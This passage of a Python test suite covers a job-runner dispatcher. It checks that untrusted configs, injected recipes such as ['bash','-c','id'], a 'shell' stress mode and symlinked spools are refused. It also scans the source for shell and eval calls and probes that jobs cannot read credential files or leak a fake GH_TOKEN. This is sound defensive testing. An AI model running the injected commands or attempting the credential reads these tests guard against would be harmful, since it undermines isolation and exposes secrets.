                self.assertNotIn('stop', self.box.verbs())
                self.assertEqual(os.listdir(self.box.cancel), [])

    def test_cancel_with_bad_name(self):
        self.box.write_cancel('memo_bridge_hub')
        result = self.box.run()
        self.assertIn('reason=invalid_name', result.stderr)
        self.assertNotIn('stop', self.box.verbs())
        self.assertEqual(os.listdir(self.box.cancel), [])


class LayoutTests(DispatchTestCase):
    def test_untrusted_config_touches_nothing(self):
        self.box.request()
        self.box.write_config({'dispatch': {'root': self.box.root}}, mode=0o666)
        result = self.box.run()
        self.assertEqual(result.returncode, 2)
        self.assertIn('reason=config_untrusted', result.stderr)
        self.assertEqual(self.box.calls(), [])
        self.assertEqual(len(os.listdir(self.box.queue)), 1)

    def test_config_cannot_widen_the_allowlist(self):
        self.box = Sandbox(self, {'recipes': {'test': [['npm', 'test'], ['bash', '-c', 'id']]}})
        self.box.request()
        result = self.box.run()
        self.assertEqual(result.returncode, 2)
        self.assertIn('reason=recipe_not_builtin', result.stderr)
        self.assertEqual(self.box.calls(), [])

    def test_config_new_recipe_name_refused(self):
        self.box = Sandbox(self, {'recipes': {'deploy': [['npm', 'test']]}})
        self.assertEqual(self.box.run().returncode, 2)

    def test_config_unknown_key_refused(self):
        self.box = Sandbox(self, {'unit_properties': {'User': 'root'}})
        result = self.box.run()
        self.assertEqual(result.returncode, 2)
        self.assertIn('reason=config_unknown_key', result.stderr)

    def test_config_timeout_above_hard_max(self):
        self.box = Sandbox(self, {'max_timeout_seconds': 7200})
        self.assertEqual(self.box.run().returncode, 2)

    def test_config_missing(self):
        os.unlink(self.box.config)
        self.assertEqual(self.box.run().returncode, 2)

    def test_symlinked_spool_queue_is_refused(self):
        elsewhere = os.path.join(self.box.tmp, 'elsewhere')
        os.mkdir(elsewhere, 0o700)
        os.rmdir(self.box.queue)
        os.symlink(elsewhere, self.box.queue)
        result = self.box.run()
        self.assertEqual(result.returncode, 2)
        self.assertIn('reason=spool_queue_unavailable', result.stderr)

    def test_group_writable_jobs_folder_is_refused(self):
        os.chmod(self.box.jobs, 0o771)
        result = self.box.run()
        self.assertEqual(result.returncode, 2)
        self.assertIn('reason=jobs_untrusted', result.stderr)

    def test_lock_held_means_another_dispatch_runs(self):
        self.box.request()
        fd = os.open(self.box.lock, os.O_RDWR | os.O_CREAT, 0o600)
        self.addCleanup(os.close, fd)
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        result = self.box.run()
        self.assertEqual(result.returncode, 0)
        self.assertIn('event=dispatch_already_running', result.stderr)
        self.assertEqual(self.box.calls(), [])
        self.assertEqual(len(os.listdir(self.box.queue)), 1)

    def test_missing_lock_folder_is_created_private(self):
        # lab-infra's memo-runner-dispatch.service has no RuntimeDirectory=: the dispatcher
        # creates /run/memo-runner-dispatch itself.
        shutil.rmtree(self.box.run_dir)
        self.box.request()
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('started=1', result.stderr)
        self.assertEqual(stat.S_IMODE(os.lstat(self.box.run_dir).st_mode), 0o700)

    def test_open_lock_folder_is_refused(self):
        os.chmod(self.box.run_dir, 0o777)
        self.box.request()
        result = self.box.run()
        self.assertNotEqual(result.returncode, 0)
        self.assertIn('lock_unavailable', result.stderr)
        self.assertEqual(self.box.calls(), [])

    def test_lab_infra_runner_json_top_level_keys_are_ignored(self):
        # The shape lab-infra writes (role memo-bridge, runner.json.j2): only `dispatch` is ours.
        with open(self.box.config) as handle:
            document = json.load(handle)
        document.update({
            'version': 1, 'managed_by': 'lab-infra role memo-bridge', 'host': 'vps', 'concurrency': 1,
            'pilot_repos': ['memolabs-dev/memo-bridge'], 'recipes': ['test', 'build', 'lint'],
            'paths': {'root': '/var/lib/memo-runner'},
            'job_unit': {'template': 'memo-job@.service', 'dropin': '50-dispatch.conf'},
            'budgets': {'disk_bytes': 21474836480, 'du_interval_sec': 60},
            'admission': {'min_free_disk_bytes': 42949672960, 'retry_sec': 30},
        })
        self.box.write_config(document)
        self.box.request()
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('started=1', result.stderr)

    def test_recipe_name_list_narrows_the_allowlist(self):
        # Verifier finding 2: lab-infra renders dispatch.recipes from memo_runner_recipes, a list
        # of names. A name left out is refused; a listed name keeps its built-in shapes.
        self.box = Sandbox(self, {'recipes': ['test', 'lint']})
        self.box.request(recipe='build')
        self.assertRefused(self.box.run(), 'recipe_not_allowed')
        self.box = Sandbox(self, {'recipes': ['test']})
        self.box.request()
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        with open(self.box.dropin_file()) as handle:
            self.assertIn('MEMO_JOB_ALLOWED_ARGV=cargo:test,go:test:./...,make:test,npm:test,python3:-m:pytest:-q ',
                          handle.read())

    def test_recipe_name_list_cannot_add_or_repeat(self):
        for recipes, reason in ((['test', 'deploy'], 'recipe_not_builtin'), (['test', 'test'], 'recipes_invalid'),
                                (['test', 1], 'recipes_invalid')):
            with self.subTest(recipes=recipes):
                self.box = Sandbox(self, {'recipes': recipes})
                self.box.request()
                result = self.box.run()
                self.assertEqual(result.returncode, 2)
                self.assertIn(f'reason={reason}', result.stderr)
                self.assertEqual(self.box.calls(), [])

    def test_lab_infra_dispatch_section_lowers_the_timeout(self):
        # Verifier finding 2: memo_runner_job_timeout_max_sec reaches the dispatcher as
        # dispatch.max_timeout_seconds, so a lower ceiling refuses a longer job (the drop-in's
        # RuntimeMaxSec= would otherwise override the template's).
        with open(self.box.config) as handle:
            document = json.load(handle)
        document['dispatch'].update({'max_timeout_seconds': 600, 'recipes': ['test', 'build', 'lint']})
        document.update({'recipes': ['test', 'build', 'lint'], 'job_unit': {'timeout_max_sec': 600}})
        self.box.write_config(document)
        self.box.request(timeout_seconds=601)
        self.assertRefused(self.box.run(), 'invalid_timeout')
        self.box.request(DID2, timeout_seconds=600)
        result = self.box.run()
        self.assertIn('started=1', result.stderr)

    def test_empty_spool_is_a_no_op(self):
        result = self.box.run()
        self.assertEqual(result.returncode, 0)
        self.assertEqual(self.box.calls(), [])
        self.assertIn('started=0', result.stderr)

    def test_entries_bounded_per_run(self):
        for index in range(70):
            self.box.write_queue(f'junk-{index:02d}', b'{}')
        self.box.run()
        self.assertEqual(len(os.listdir(self.box.queue)), 6)

    def test_no_shell_in_sources(self):
        for path in (DISPATCH, RECORD):
            with open(path) as handle:
                source = handle.read()
            with self.subTest(path=os.path.basename(path)):
                self.assertTrue(source.startswith('#!/usr/bin/python3 -I\n'))
                for forbidden in (r'shell\s*=\s*True', r'\bos\.system\b', r'\bos\.popen\b', r'\bos\.exec',
                                  r'(?<![.\w])eval\(', r'(?<![.\w])exec\(', r'\bimport\s+pty\b'):
                    self.assertIsNone(re.search(forbidden, source), forbidden)

    def test_id_rules_agree_with_record_result_and_executor(self):
        with open(DISPATCH) as handle:
            dispatch = handle.read()
        with open(RECORD) as handle:
            record = handle.read()
        rule = "DISPATCH_ID_RE = re.compile(r'[a-z0-9][a-z0-9-]{7,63}')"
        self.assertIn(rule, dispatch)
        self.assertIn(rule, record)
        if os.path.exists(EXECUTOR):
            with open(EXECUTOR) as handle:
                self.assertIn('DISPATCH_ID_RE = /^[a-z0-9-]{8,64}$/', handle.read())
        with open(os.path.join(REPO, 'server', 'runners', 'jobs.mjs')) as handle:
            self.assertIn('JOB_ID_RE = /^job_[A-Za-z0-9_-]{16}$/', handle.read())


class StatusTests(DispatchTestCase):
    def test_status_reports_queue_active_unit_and_last_result(self):
        self.box.request()
        self.box.run()
        self.box.request(DID2)
        env = dict(os.environ, SERVICE_RESULT='success', EXIT_CODE='exited', EXIT_STATUS='0')
        recorded = subprocess.run([sys.executable, '-I', RECORD, '--config', self.box.config, DID],
                                  env=env, capture_output=True, text=True, timeout=60)
        self.assertEqual(recorded.returncode, 0, recorded.stderr)
        before = self.box.calls()
        result = self.box.run('--status')
        self.assertEqual(result.returncode, 0, result.stderr)
        report = json.loads(result.stdout)
        self.assertEqual(report['queue_depth'], 1)
        self.assertEqual(report['cancel_pending'], 0)
        self.assertEqual(report['active_units'], [f'memo-job@{DID}.service'])
        self.assertEqual(report['last_result']['status'], 'succeeded')
        self.assertEqual(report['last_result']['job_id'], JOB_ID)
        self.assertEqual(report['last_dispatch']['outcome'], 'started')
        self.assertIsInstance(report['free_disk_bytes'], int)
        new_verbs = [call[0] for call in self.box.calls()[len(before):]]
        self.assertEqual(sorted(set(new_verbs)), ['list-jobs', 'list-units'], 'status changes nothing')
        self.assertEqual(len(os.listdir(self.box.queue)), 1)

    def test_status_when_systemctl_fails(self):
        self.box.set_state({'list_rc': 1})
        result = self.box.run('--status')
        self.assertEqual(result.returncode, 1)
        self.assertFalse(json.loads(result.stdout)['systemctl_ok'])


def node_or_skip(testcase):
    node = shutil.which('node')
    if node is None:
        testcase.skipTest('node is not installed')
    return node


class ExecutorContractTests(DispatchTestCase):
    """The spool and status files as server/runners/executor-systemd.mjs (TODO-P4-07) writes and
    reads them: launch -> dispatch -> record-result -> executor.result, and stop -> dispatch."""

    SCRIPT = r'''
const [, , executorPath, root, worktree, action, uid] = process.argv;
const { createSystemdExecutor } = await import(executorPath);
const executor = createSystemdExecutor({ root, statusOwnerUid: Number(uid) });
const job = { id: 'job_AbCdEfGh12345678', recipe: 'test', timeout_ms: 900000 };
let out;
if (action === 'launch') out = await executor.launch({ job, worktreePath: worktree });
else if (action === 'stop') out = executor.stop(job);
else out = executor.result(job);
process.stdout.write(JSON.stringify(out));
'''

    def executor(self, action):
        if not os.path.exists(EXECUTOR):
            self.skipTest('executor-systemd.mjs is not present')
        node = node_or_skip(self)
        result = subprocess.run([node, '--input-type=module', '-e', self.SCRIPT, '_', EXECUTOR, self.box.root,
                                 self.box.worktree, action, str(os.geteuid())],
                                env={'PATH': os.environ.get('PATH', '')}, capture_output=True, text=True, timeout=60)
        self.assertEqual(result.returncode, 0, result.stderr)
        return json.loads(result.stdout)

    def test_launch_dispatch_record_and_read_back(self):
        launched = self.executor('launch')
        self.assertTrue(launched['ok'], launched)
        self.assertEqual(launched['dispatch_id'], DID)
        result = self.box.run()
        self.assertEqual(self.box.starts(), [['start', '--no-block', f'memo-job@{DID}.service']], result.stderr)
        env = {'PATH': '/usr/bin:/bin', 'SERVICE_RESULT': 'timeout', 'EXIT_CODE': 'killed', 'EXIT_STATUS': 'TERM'}
        recorded = subprocess.run([sys.executable, '-I', RECORD, '--config', self.box.config, DID],
                                  env=env, capture_output=True, text=True, timeout=60)
        self.assertEqual(recorded.returncode, 0, recorded.stderr)
        read = self.executor('result')
        self.assertTrue(read['ok'], read)
        self.assertEqual(read['result']['service_result'], 'timeout')
        self.assertEqual(read['result']['exit_status'], 'TERM')

    def test_refusal_is_readable_by_the_executor(self):
        os.unlink(os.path.join(self.box.worktree, '.git'))
        self.executor('launch')
        self.box.run()
        read = self.executor('result')
        self.assertTrue(read['ok'], read)
        self.assertEqual(read['result']['service_result'], 'dispatch_refused')

    def test_stop_of_a_running_job(self):
        self.executor('launch')
        self.box.run()
        stopped = self.executor('stop')
        self.assertTrue(stopped['ok'], stopped)
        self.box.run()
        self.assertEqual(self.box.calls()[-1], ['stop', '--no-block', f'memo-job@{DID}.service',
                                                f'memo-job-install@{DID}.service'])


class FixtureTests(DispatchTestCase):
    """TODO-P4-14: the probe and stress fixtures are ordinary `npm test` worktrees."""

    def test_fixtures_are_plain_npm_test_repositories(self):
        for name in ('isolation', 'stress'):
            with self.subTest(fixture=name):
                with open(os.path.join(FIXTURES, name, 'package.json')) as handle:
                    scripts = json.load(handle)['scripts']
                self.assertEqual(sorted(scripts), ['test'])
                self.box = Sandbox(self, {'recipes': {'test': [['npm', 'test']]}})
                path = self.box.make_worktree('runner-probe', f'agent-1-{name}', os.path.join(FIXTURES, name))
                self.box.request(worktree=path)
                self.box.run()
                self.assertEqual(len(self.box.starts()), 1)

    def node(self, *args, cwd=None, env=None):
        node = node_or_skip(self)
        return subprocess.run([node, *args], cwd=cwd, env=env or {'PATH': os.environ.get('PATH', '')},
                              capture_output=True, text=True, timeout=60)

    def test_probe_plan_covers_ac_p4_12(self):
        result = self.node(os.path.join(FIXTURES, 'isolation', 'probe.mjs'), '--plan', cwd=self.box.worktree)
        self.assertEqual(result.returncode, 0, result.stderr)
        checks = {item['check']: item['expect'] for item in json.loads(result.stdout)['plan']}
        for port in (4000, 5000, 9443, 4096):
            self.assertEqual(checks[f'tcp_loopback_{port}'], 'deny')
        for name in ('tcp_private_10.0.4.1', 'unix_run_docker.sock', 'read_var_lib_memo-bridge', 'abstract_unix_listeners',
                     'read_etc_credstore', 'read_etc_github.env', 'write_worktree_parent', 'write_etc',
                     'env_no_secrets', 'groups_unprivileged', 'no_new_privileges'):
            self.assertEqual(checks[name], 'deny', name)
        for name in ('tcp_github.com_443', 'tcp_registry.npmjs.org_443', 'write_worktree'):
            self.assertEqual(checks[name], 'allow', name)

    def test_probe_judges_results_without_printing_secrets(self):
        probe = os.path.join(FIXTURES, 'isolation', 'probe.mjs')
        readable = os.path.join(self.box.tmp, 'readable.env')
        with open(readable, 'w') as handle:
            handle.write('GH_TOKEN=do-not-print-me\n')
        writable = os.path.join(self.box.tmp, 'writable')
        os.mkdir(writable)
        # /proc/net/unix as the job would see it in the host network namespace (verifier finding 8).
        header = 'Num       RefCount Protocol Flags    Type St Inode Path\n'
        unix_none = os.path.join(self.box.tmp, 'unix-none')
        unix_one = os.path.join(self.box.tmp, 'unix-one')
        with open(unix_none, 'w') as handle:
            handle.write(header + '0000000000000000: 00000002 00000000 00010000 0001 01 13716 /run/containerd/s/x\n'
                                  '0000000000000000: 00000002 00000000 00000000 0001 03 13717 @client-side\n')
        with open(unix_one, 'w') as handle:
            handle.write(header + '0000000000000000: 00000002 00000000 00010000 0001 01 13718 @/tmp/.X11-unix/X0\n')
        script = (
            'const { run } = await import(process.argv[2]);'
            'const checks = JSON.parse(process.argv[3]);'
            'const env = { PATH: "/usr/bin", GH_TOKEN: "do-not-print-me", HOME: "/x" };'
            'process.stdout.write(JSON.stringify(await run(checks, env)));'
        )
        checks = [
            {'check': 'read_secret_file', 'kind': 'read', 'path': readable, 'expect': 'deny'},
            {'check': 'read_absent', 'kind': 'read', 'path': os.path.join(self.box.tmp, 'absent'), 'expect': 'deny'},
            {'check': 'write_denied_dir', 'kind': 'write', 'dir': writable, 'expect': 'deny'},
            {'check': 'write_allowed_dir', 'kind': 'write', 'dir': writable, 'expect': 'allow'},
            {'check': 'env', 'kind': 'env', 'expect': 'deny'},
            {'check': 'closed_port', 'kind': 'tcp', 'host': '127.0.0.1', 'port': 9, 'expect': 'deny'},
            {'check': 'abstract_none', 'kind': 'abstract', 'file': unix_none, 'expect': 'deny'},
            {'check': 'abstract_one', 'kind': 'abstract', 'file': unix_one, 'expect': 'deny'},
        ]
        # argv[1] is a placeholder, so probe.mjs does not see itself as the main module.
        result = self.node('--input-type=module', '-e', script, '_', probe, json.dumps(checks))
        self.assertEqual(result.returncode, 0, result.stderr)
        outcomes = {item['check']: (item['outcome'], item['detail']) for item in json.loads(result.stdout)}
        self.assertEqual(outcomes['read_secret_file'], ('fail', 'readable'))
        self.assertEqual(outcomes['read_absent'], ('pass', 'ENOENT'))
        self.assertEqual(outcomes['write_denied_dir'], ('fail', 'written'))
        self.assertEqual(outcomes['write_allowed_dir'], ('pass', 'written'))
        self.assertEqual(outcomes['env'], ('fail', 'names:GH_TOKEN'))
        # A closed port answers ECONNREFUSED: the packet got through, so that is not isolation.
        self.assertEqual(outcomes['closed_port'], ('fail', 'ECONNREFUSED'))
        self.assertEqual(outcomes['abstract_none'], ('pass', 'abstract_listeners:0'))
        self.assertEqual(outcomes['abstract_one'], ('fail', 'abstract_listeners:1'))
        self.assertNotIn('X11', result.stdout)
        self.assertNotIn('do-not-print-me', result.stdout)
        self.assertEqual(os.listdir(writable), [], 'files the probe creates are removed')

    def test_stress_dry_run_and_validation(self):
        stress = os.path.join(FIXTURES, 'stress', 'stress.mjs')
        result = self.node(stress, '--dry-run', cwd=os.path.join(FIXTURES, 'stress'))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)['plan'], {'mode': 'sleep', 'seconds': 600, 'ignore_sigterm': False})
        bad = os.path.join(self.box.tmp, 'bad.json')
        for config, error in (({'mode': 'memory', 'target_mib': 10**9}, 'invalid:target_mib'),
                              ({'mode': 'shell', 'command': 'id'}, 'unknown_mode'),
                              ({'mode': 'cpu', 'workers': 2, 'command': 'id'}, 'unknown_key:command'),
                              ({'mode': 'sleep', 'seconds': '600'}, 'invalid:seconds')):
            with self.subTest(error=error):
                with open(bad, 'w') as handle:
                    json.dump(config, handle)
                result = self.node(stress, '--dry-run', '--config', bad)
                self.assertEqual(result.returncode, 2)
                self.assertEqual(json.loads(result.stdout)['error'], error)

    def test_stress_refuses_outside_a_job_unit(self):
        stress = os.path.join(FIXTURES, 'stress', 'stress.mjs')
        result = self.node(stress, cwd=os.path.join(FIXTURES, 'stress'))
        self.assertEqual(result.returncode, 2)
        self.assertEqual(json.loads(result.stdout)['error'], 'refused_outside_memo_job')


if __name__ == '__main__':
    unittest.main()
